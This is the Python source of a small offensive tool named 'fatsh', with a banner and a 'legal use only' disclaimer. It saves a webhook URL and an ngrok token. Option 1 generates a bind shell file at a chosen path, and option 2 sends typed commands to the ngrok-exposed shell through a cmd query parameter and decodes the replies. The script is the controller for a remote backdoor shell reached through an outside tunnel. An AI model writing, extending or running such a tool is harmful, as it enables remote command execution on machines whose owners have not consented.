import os
import shell
import json
from colorama import Fore
import sys
import requests
from urllib.parse  import unquote

osn=os.name
banner="""
                    ███████╗ █████╗ ████████╗███████╗██╗  ██╗
                    ██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║
                    █████╗  ███████║   ██║   ███████╗███████║
                    ██╔══╝  ██╔══██║   ██║   ╚════██║██╔══██║
                    ██║     ██║  ██║   ██║   ███████║██║  ██║
                    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     

"""+ Fore.RED +"""
                                   !!!ATTENTION!!!


           It is intended for legal use only. I am not responsible for it.
      
""" + Fore.WHITE
print(banner)


with open("./config.json","r") as cfgr:
  cfg=json.load(cfgr)
  if cfg["fs"]==True:
      print(Fore.RED+"first use detected"+Fore.WHITE)
      print("your webhook url:")
      wb=input(Fore.RED+"fatsh" + Fore.YELLOW+f"@{os.getlogin()}>>"+Fore.WHITE)
      print("ngrok auth token")
      at=input(Fore.RED+"fatsh" + Fore.YELLOW+f"@{os.getlogin()}>>"+Fore.WHITE)
      cfg["webhook"]=wb
      cfg["ngrok"]=at
      cfg["fs"]=False
      with open("./config.json","w") as cfgr:
       json.dump(cfg,cfgr,indent=2)
      print("restarting...")
      sys.exit(0)
vs=os.popen("curl ")
print(Fore.BLUE+"""
[1] make bind shell
[2] connect bind shell
"""+Fore.WHITE)
ch=input(Fore.RED+"fatsh" + Fore.YELLOW+f"@{os.getlogin()}>>"+Fore.WHITE)
if ch == "1":
     with open("./config.json","r") as cfg:
       wbh=json.load(cfg)["webhook"]
     with open("./config.json","r") as cfg:
         at=json.load(cfg)["ngrok"]
     print("bind shell path:")
     pt=input(Fore.RED+"fatsh" + Fore.YELLOW+f"@{os.getlogin()}>>"+Fore.WHITE)
     sh=shell.getshell(webhook=wbh,at=at)
     try:
      with open(pt,"w") as shellf:
          shellf.write(str(sh))
     except FileNotFoundError:
         if osn == "posix":
          os.system(f"touch {pt}")
if ch == "2":
   print("ngrok url:")
   url2=input(Fore.RED+"fatsh" + Fore.YELLOW+f"@{os.getlogin()}>>"+Fore.WHITE)
   while True:
      command=input( Fore.YELLOW+f"shell>>"+Fore.WHITE)
      ret=requests.get(url=f"{url2}/?cmd={command}")
      data = ret.json()
      encoded_result = data.get("result")
      decoded_result = unquote(encoded_result)
